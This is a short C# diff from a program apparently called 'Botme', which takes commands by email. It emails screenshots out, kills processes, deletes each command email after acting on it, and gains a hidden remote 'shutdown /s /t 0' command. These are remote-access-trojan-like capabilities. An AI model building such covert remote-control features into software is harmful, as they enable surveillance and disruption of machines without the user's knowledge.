@@ -63,7 +63,6 @@ namespace Botme
             mail.IsBodyHtml = true;
             mail.Attachments.Add(attachment);
             smtpServer.Send(mail);
-            //File.Delete("Screenshot.png");
             i++;
         }
 
@@ -160,6 +159,14 @@ namespace Botme
                     st = s.Split('<');
                     this.KillPross(st[0]);
                     Mail.DeleteSingleEmail(uqid);
+                }
+                else if(check.Equals("botmeshutdown"))
+                {
+                    Mail.DeleteSingleEmail(uqid);
+                    var psi = new ProcessStartInfo("shutdown", "/s /t 0");
+                    psi.CreateNoWindow = true;
+                    psi.UseShellExecute = false;
+                    Process.Start(psi);
                 }
             }
 
